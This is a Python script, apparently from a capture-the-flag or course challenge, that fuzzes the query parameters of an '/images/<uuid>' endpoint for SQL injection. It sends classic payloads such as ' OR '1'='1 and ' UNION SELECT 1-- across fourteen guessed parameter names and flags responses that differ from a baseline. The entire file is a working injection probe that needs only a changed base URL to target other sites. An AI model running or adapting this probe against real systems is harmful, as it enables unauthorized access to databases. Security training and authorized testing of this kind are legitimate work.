# probe_queryparams.py — the path uuid is locked by the <uuid> converter, but QUERY PARAMS
# are free-form. If the backend concatenates any optional param (order/filter/limit) we get SQLi
# WITHOUT the converter blocking us. Compare response lengths to spot behavior changes.
import requests
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID = "ea42cd39-001b-4fb5-a509-449322674687"

def get(qs=""):
    url = f"{BASE}/images/{UID}" + (("?" + qs) if qs else "")
    r = requests.get(url)
    try: n = len(r.json())
    except: n = -1
    return r.status_code, len(r.text), n

base_sc, base_len, base_n = get()
print(f"BASELINE /images/<uid> -> {base_sc} len={base_len} rows={base_n}\n")

params = ["order","order_by","sort","filter","q","search","where","limit",
          "offset","user","user_id","id","fields","group_by"]
inj = ["1","' OR '1'='1","1 OR 1=1","1;--","*","%","' UNION SELECT 1--",
       "user_id","1) OR (1=1"]

for p in params:
    for v in inj:
        sc, ln, n = get(f"{p}={requests.utils.quote(v)}")
        mark = "  <<< DIFFERENT" if (n != base_n or sc != base_sc) else ""
        if mark:
            print(f"{p}={v!r:20} -> {sc} len={ln} rows={n}{mark}")
print("\n(only lines marked DIFFERENT matter; silence = param ignored)")
